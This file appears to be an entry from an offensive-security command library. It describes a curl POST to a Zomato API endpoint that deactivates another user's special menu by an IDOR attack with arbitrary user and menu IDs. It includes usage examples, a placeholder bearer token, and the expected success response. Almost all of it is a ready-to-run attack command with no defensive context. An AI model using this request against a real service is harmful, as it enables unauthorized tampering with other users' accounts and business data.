---
data: >-
  curl -X POST "https://api.zomato.com/XXX/XXXXXX" -H "Content-Type:
  application/json" -d
  '{"request_type":"deactivate-special-menu","user_id":USER_ID,"menu_set_id":XXXX}'
tags:
  - api
  - deactivation
type: command
executor: bash
platforms:
  - Mobile API
id: 583277c3-5cb0-4cc7-95c1-39e7c1977e81
created_at: '2025-12-14T17:25:29.711Z'
updated_at: '2025-12-14T17:25:29.711Z'
verified: false
validated: true
submitted: true
---
# Zomato Deactivate Menu POST

## Command

```bash
curl -X POST "https://api.zomato.com/XXX/XXXXXX" \
  -H "Content-Type: application/json" \
  -d '{"request_type":"deactivate-special-menu","user_id":USER_ID,"menu_set_id":XXXX}'
```

## Description

Final POST to deactivate a special menu using IDOR, with arbitrary IDs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| request_type | Action ("deactivate-special-menu") | Yes |
| user_id | User ID (USER_ID) | Yes |
| menu_set_id | Menu ID (XXXX) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://api.zomato.com/XXX/XXXXXX" -H "Content-Type: application/json" -d '{"request_type":"deactivate-special-menu","user_id":12345,"menu_set_id":678}'
```

### Advanced Usage

```bash
# With auth headers
curl -X POST "https://api.zomato.com/XXX/XXXXXX" -H "Authorization: Bearer token" -H "Content-Type: application/json" -d '{"request_type":"deactivate-special-menu","user_id":12345,"menu_set_id":678}'
```

## Expected Output

Success response, e.g., {"status": "deactivated", "menu_id": 678}.

## Related

- [[Related Procedure: Deactivate-Special-Menu-via-IDOR]]
